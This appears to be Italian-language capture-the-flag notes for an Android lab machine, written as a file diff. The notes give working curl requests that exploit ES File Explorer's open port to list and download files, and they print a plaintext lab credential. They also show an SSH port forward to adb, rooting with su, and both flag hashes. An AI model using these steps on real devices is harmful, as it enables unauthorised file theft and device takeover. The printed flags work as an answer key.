@@ -1,0 +1,131 @@
+10.10.10.247 	(ANDROID)
+
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-26 17:11 CEST
+Nmap scan report for 10.10.10.247
+Host is up (0.047s latency).
+Not shown: 998 closed ports
+PORT     STATE    SERVICE VERSION
+2222/tcp open     ssh     (protocol 2.0)
+| fingerprint-strings: 
+|   NULL: 
+|_    SSH-2.0-SSH Server - Banana Studio
+| ssh-hostkey: 
+|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
+5555/tcp filtered freeciv
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port2222-TCP:V=7.91%I=7%D=9/26%Time=61508DC2%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.69 seconds
+
+
+sulla porta 2222 c'è banana studio, un'app che fa da server ftp
+sulla porta 5555 Freeciv is a turn-based empire-building strategy game
+
+
+nmap -p0-65535 10.10.10.247
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-26 17:19 CEST
+Nmap scan report for 10.10.10.247
+Host is up (0.048s latency).
+Not shown: 65531 closed ports
+PORT      STATE    SERVICE
+2222/tcp  open     EtherNetIP-1
+5555/tcp  filtered freeciv
+42135/tcp open     unknown
+45791/tcp open     unknown
+59777/tcp open     unknown
+
+
+42135/tcp open   http    ES File Explorer Name Response httpd
+|_http-title: Site doesn't have a title (text/html).
+45791/tcp closed unknown
+59777/tcp open   http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
+|_http-title: Site doesn't have a title (text/plain).
+Service Info: Device: phone
+
+ES FILE EXPLORER sulla porta 59777 espone un server http che è possibile listare tramite una vulnerability:
+https://github.com/fs0c131y/ESFileExplorerOpenPortVuln
+
+oppure (sfruttando la stessa vuln) tramite curl:
+
+curl --header "Content-Type: application/json" --request POST --data "{\"command\":\"listFiles\"}" http://10.10.10.247:59777/sdcard/
+
+e visualizzarlo nel browser: http://10.10.10.247:59777/sdcard/user.txt  (o scaricarlo sempre tramite curl)
+ user: f32017174c7c7e8f50c6da52891ae250
+ 
+ 
+a questo punto si deve fare privesc il problema è che ho solo trovato un accesso ai file ma non ho uno user e non ho una shell
+
+continuo a cercare se tra i file c'è qualcosa di interessante:
+
+curl --header "Content-Type: application/json" --request POST --data "{\"command\":\"listFiles\"}" http://10.10.10.247:59777/sdcard/DCIM
+[
+{"name":"concept.jpg", "time":"4/21/21 02:38:08 AM", "type":"file", "size":"135.33 KB (138,573 Bytes)", }, 
+{"name":"anc.png", "time":"4/21/21 02:37:50 AM", "type":"file", "size":"6.24 KB (6,392 Bytes)", }, 
+{"name":"creds.jpg", "time":"4/21/21 02:38:18 AM", "type":"file", "size":"1.14 MB (1,200,401 Bytes)", }, 
+{"name":"224_anc.png", "time":"4/21/21 02:37:21 AM", "type":"file", "size":"124.88 KB (127,876 Bytes)", }
+]
+
+scarico creds.jpg: curl -X GET http://10.10.10.247:59777/sdcard/DCIM/creds.jpg --output creds.jpg
+
+e ci trovo delle credenziali scritte su un foglio:
+
+kristi:Kr1sT!5h@Rp3xPl0r3!
+
+potrei usarle per accedere al servizio ssh/sftp sulla porta 2222
+
+ssh -p 2222 kristi@10.10.10.247
+Password authentication
+Password: 
+:/ $ id
+uid=10076(u0_a76) gid=10076(u0_a76) groups=10076(u0_a76),3003(inet),9997(everybody),20076(u0_a76_cache),50076(all_a76) context=u:r:untrusted_app:s0:c76,c256,c512,c768
+:/ $ 
+
+
+a questo punto si deve fare privesc
+forse è possibile farlo con qualcuna delle app installate, posso usare la stessa vuln di prima per cercare quali app sono installate
+
+oppure connettermi con adb alla porta 5555
+
+adb connect 10.10.10.247:5555
+
+per connettersi pc e device android devono trovarsi sulla stessa network quindi potrebbe non funzionare 
+per aggirare questo problema si può usare il port forward:
+
+sudo ssh -p 2222 -L 5555:127.0.0.1:5555 kristi@10.10.10.247
+adb connect 127.0.0.1:5555
+
+adb connesso, per ottenere shell usare 
+adb shell
+
+a questo punto nella shell basta usare 
+su
+per ottenere i permessi di root
+127|x86_64:/ $ su
+:/ # id
+uid=0(root) gid=0(root) groups=0(root) context=u:r:su:s0
+
+il file root.txt è sotto /data:
+
+f04fc82b6d49b41c9b08982be59338c5
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
